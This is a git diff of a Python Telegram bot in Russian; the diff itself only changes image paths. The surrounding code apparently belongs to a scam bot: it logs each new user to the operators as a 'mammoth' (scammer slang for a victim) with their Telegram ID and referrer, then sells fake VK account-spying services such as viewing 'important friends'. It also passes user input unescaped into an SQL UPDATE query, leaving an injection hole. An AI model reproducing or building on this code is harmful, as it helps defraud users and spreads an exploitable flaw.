@@ -57,18 +57,18 @@ async def start(message: types.Message):
                 await state.update_data(refer=message.text)
                 await state.finish()
                 await bot.send_message(logs, f"Мамонт в боте!\nTG ID: {message.chat.id}\nUsername: @{message.chat.username}\nNickname: {message.chat.first_name}\nПригласил: Пропущено")
-                await bot.send_photo(message.chat.id, photo=open(f'photo/vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
+                await bot.send_photo(message.chat.id, photo=open(f'vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
                 pass
             else:
                 await state.update_data(refer=message.text)
                 cursor.execute(f"UPDATE Users SET ref = '{message.text}' WHERE chatid = {message.chat.id}")
                 conn.commit()
                 await bot.send_message(logs, f"Мамонт в боте!\nTG ID: {message.chat.id}\nUsername: @{message.chat.username}\nNickname: {message.chat.first_name}\nПригласил: {message.text}")
-                await bot.send_photo(message.chat.id, photo=open(f'photo/vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
+                await bot.send_photo(message.chat.id, photo=open(f'vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
                 await state.finish()
                 pass
     else:
-        await bot.send_photo(message.chat.id, photo=open(f'photo/vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
+        await bot.send_photo(message.chat.id, photo=open(f'vk.jpg', 'rb'), caption=f'<b>Введите ссылку на страницу:</b>', parse_mode='html', reply_markup=types.ReplyKeyboardRemove())
         pass
         
 @dp.message_handler(content_types=["text"])
@@ -84,7 +84,7 @@ async def ref(message: types.Message):
             types.InlineKeyboardButton(text=f"👥Посмотреть важных друзей - {price[3]} руб", callback_data="friends")
             ]
         keyboard.add(*buttons)
-        await bot.send_photo(message.chat.id, photo=open(f'photo/func.jpg', 'rb'), caption=f"👁<b>Данные о странице:</b>\n\n<b>ВК ID:</b> {decod['vkId']}\n<b>Имя:</b> {decod['firstName']}\n<b>Фамилия:</b> {decod['lastName']}\n\nВыберите действие:", reply_markup=keyboard, parse_mode='html')
+        await bot.send_photo(message.chat.id, photo=open(f'func.jpg', 'rb'), caption=f"👁<b>Данные о странице:</b>\n\n<b>ВК ID:</b> {decod['vkId']}\n<b>Имя:</b> {decod['firstName']}\n<b>Фамилия:</b> {decod['lastName']}\n\nВыберите действие:", reply_markup=keyboard, parse_mode='html')
         pass
     else:
         await bot.send_message(message.chat.id, f"Ссылка неверного формата!\nПример ссылки: vk.com/durov")
